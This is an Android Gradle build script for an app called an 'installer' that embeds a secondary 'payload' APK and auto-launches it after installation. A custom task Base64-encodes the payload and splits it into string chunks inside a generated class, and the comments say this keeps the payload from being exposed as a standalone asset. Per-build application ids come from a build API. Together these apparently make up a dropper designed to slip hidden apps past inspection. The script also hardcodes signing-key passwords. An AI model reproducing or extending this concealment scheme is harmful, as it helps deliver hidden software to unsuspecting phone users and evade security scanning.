plugins { id 'com.android.application' }

// Per-build payload package name. build.sh writes it to installer/payload.pkg so the installer
// can detect "already installed" and auto-launch the payload after install.
def pkgFile = rootProject.file('installer/payload.pkg')
def PAYLOAD_PACKAGE = pkgFile.exists() ? pkgFile.text.trim() : ''

// Per-build installer applicationId override (written by build.sh when invoked
// from /api/build/apk). Falls back to the default in-tree id otherwise.
def instAppIdFile = rootProject.file('installer/build.app_id')
def INSTALLER_APP_ID = instAppIdFile.exists() ? instAppIdFile.text.trim() : 'com.onerule.task'

android {
    namespace 'com.onerule.task'
    compileSdk 36

    defaultConfig {
        applicationId INSTALLER_APP_ID
        minSdk 24
        targetSdk 36
        versionCode 1
        versionName "1.0"
        buildConfigField "String", "PAYLOAD_PACKAGE", "\"${PAYLOAD_PACKAGE}\""
        // Inject payload package into AndroidManifest.xml so the installer
        // can declare a <queries> entry for it (Android 11+ package
        // visibility — without this getLaunchIntentForPackage returns null
        // even when the app is installed).
        manifestPlaceholders = [payloadPackage: PAYLOAD_PACKAGE ?: "com.installer.placeholder"]
    }

    buildFeatures {
        buildConfig true
    }

    signingConfigs {
        release {
            storeFile file(rootProject.file("app/release.keystore"))
            storePassword "K#9mXq@Lp2!ZrVt&NwYsBjC5uEhGfD8"
            keyAlias "tusker_key"
            keyPassword "K#9mXq@Lp2!ZrVt&NwYsBjC5uEhGfD8"
        }
    }

    buildTypes {
        release {
            minifyEnabled false
            shrinkResources false
            signingConfig signingConfigs.release
        }
        debug {
            signingConfig signingConfigs.release
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

}

// The compressed APK container is staged outside src/main/assets and compiled
// into a generated Java class. Its Base64 literals therefore live in classes.dex
// instead of being exposed as a standalone APK asset.
def dexPayloadInput = layout.buildDirectory.file('payload/module.zip')
def dexPayloadSources = layout.buildDirectory.dir('generated/dexPayload/java')
android.sourceSets.main.java.srcDir(dexPayloadSources)

tasks.register('generateDexPayload') {
    inputs.file(dexPayloadInput)
    outputs.dir(dexPayloadSources)

    doLast {
        File input = dexPayloadInput.get().asFile
        if (!input.isFile() || input.length() == 0) {
            throw new GradleException(
                "Installer payload is missing or empty: ${input}. Run build.sh to stage it."
            )
        }

        String encoded = java.util.Base64.encoder.encodeToString(input.bytes)
        String namespace = android.namespace
        String packagePath = namespace.replace('.', '/')
        File output = new File(
            dexPayloadSources.get().asFile,
            "${packagePath}/DexPayload.java"
        )
        project.delete(dexPayloadSources.get().asFile)
        output.parentFile.mkdirs()

        StringBuilder source = new StringBuilder()
        source.append("package ${namespace};\n")
        source.append("import android.util.Base64;\n")
        source.append("import java.io.ByteArrayInputStream;\n")
        source.append("import java.io.InputStream;\n")
        source.append("final class DexPayload {\n")
        source.append("  private static final String[] CHUNKS = {\n")
        final int chunkSize = 32000
        for (int offset = 0; offset < encoded.length(); offset += chunkSize) {
            int end = Math.min(offset + chunkSize, encoded.length())
            source.append("    \"")
                .append(encoded.substring(offset, end))
                .append("\",\n")
        }
        source.append("  };\n")
        source.append("  static InputStream open() {\n")
        source.append("    StringBuilder value = new StringBuilder(${encoded.length()});\n")
        source.append("    for (String chunk : CHUNKS) value.append(chunk);\n")
        source.append("    byte[] bytes = Base64.decode(value.toString(), Base64.NO_WRAP);\n")
        source.append("    return new ByteArrayInputStream(bytes);\n")
        source.append("  }\n")
        source.append("  private DexPayload() {}\n")
        source.append("}\n")
        output.setText(source.toString(), 'UTF-8')
    }
}

tasks.named('preBuild').configure {
    dependsOn(tasks.named('generateDexPayload'))
}

configurations.all {
    resolutionStrategy {
        force 'org.jetbrains.kotlin:kotlin-stdlib:1.8.22'
        eachDependency { details ->
            if (details.requested.group == 'org.jetbrains.kotlin'
                    && details.requested.name == 'kotlin-stdlib') {
                details.useVersion '1.8.22'
            }
        }
    }
    exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk7'
    exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk8'
}

dependencies {
    implementation 'androidx.core:core:1.13.1'
}
